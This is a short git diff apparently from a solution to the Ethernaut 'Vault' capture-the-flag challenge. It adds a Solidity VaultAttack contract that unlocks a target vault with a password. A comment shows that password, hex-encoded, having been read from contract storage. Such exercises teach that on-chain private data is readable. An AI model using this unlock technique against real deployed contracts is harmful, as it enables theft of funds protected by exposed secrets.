@@ -18,6 +18,13 @@ The hexadecmal is generated from above and is implicitly  converted to byte32 by
 2. contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
  */
 
+ contract VaultAttack {
+  function attack(address _target, bytes32 _password) public {
+    Vault vault = Vault(_target);
+    vault.unlock(_password);
+  }
+}
+
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
